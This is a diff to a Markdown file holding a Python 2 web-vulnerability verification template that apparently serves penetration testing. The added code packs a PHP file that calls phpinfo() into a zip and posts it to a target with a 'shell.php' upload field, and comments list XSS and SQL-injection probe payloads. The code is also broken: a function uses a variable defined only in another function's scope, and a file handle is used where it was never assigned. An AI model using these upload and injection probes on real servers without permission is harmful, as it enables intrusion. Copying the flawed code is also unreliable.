@@ -728,7 +728,7 @@ data = '''{"query":"query queryAlarms($keyword: String, $scope: Scope, $duration
 ```python
 # -*- coding: utf-8 -*-
 ​
-import requests,random,hashlib,json,time,re,base64
+import requests, random, hashlib, json, time, re, base64, zipfile, os, urllib2, socket, telnetlib
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 from bs4 import BeautifulSoup
@@ -738,6 +738,14 @@ from bs4 import BeautifulSoup
 # VERSION:
 #
 ​
+def up_zip():
+    myzip = zipfile.ZipFile('{}.zip'.format(yuju), mode='a', 
+                            compression=zipfile.ZIP_DEFLATED)
+    myzip.writestr("Yxuan.php", "<?php echo md5({});phpinfo();?>".format(yuju))
+    myzip.close()
+    zip_data = open('{}.zip'.format(yuju))
+    return zip_data
+    
 def verify(target):
     # 检测SQL注入以及XSS，文件写入等，可使用随机数
     yuju = str(random.randint(0, 999999))
@@ -746,17 +754,20 @@ def verify(target):
     url = target + path
     headers = {
         "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
-        # "Cookie":config.conf['cookie'],
+        # "Cookie":'cookie',
         # "": "",
         # "": "",
         # "": "",
         "Content-Type": "application/x-www-form-urlencoded",
         }
     data = ""
+    # zip_data = open('{}.zip'.format(yuju))
+    data = up_zip()
     # 文件上传时使用，或传递特殊形式参数使用
     file = {
         'name': ('filename', u'文件内容', u'文件自定义Content-Type'),
         'file[]': ('shell.php', data, 'application/octet-stream'),
+        'zipfile': ('{}.zip'.format(yuju), zip_data),
         'name2': (None, 'huan'),
         None: ('haha', 'ni'),
         None: ('xixi', 'ya'),
@@ -765,6 +776,10 @@ def verify(target):
 ​
     try:
        req = requests.post(url, headers=headers, data=data, files=file, timeout=10, verify=False, allow_redirects=False)
+       
+       zip_data.close()
+       os.remove('{}.zip'.format(yuju))
+       
        # 调试语句
        print req.status_code
        print req.headers
@@ -780,7 +795,7 @@ def verify(target):
 verify("")
 # sqli  :  mdfive = hashlib.md5(yuju).hexdigest()
 # xss      <script>alert(yuju)</script>
-# import time; now = time.time() sendtime = time.time()-now
+# time_sqli: import time; now = time.time() sendtime = time.time()-now
 # proxy={"http": "http://127.0.0.1:8081","https": "https://127.0.0.1:8081"}
 ```
 
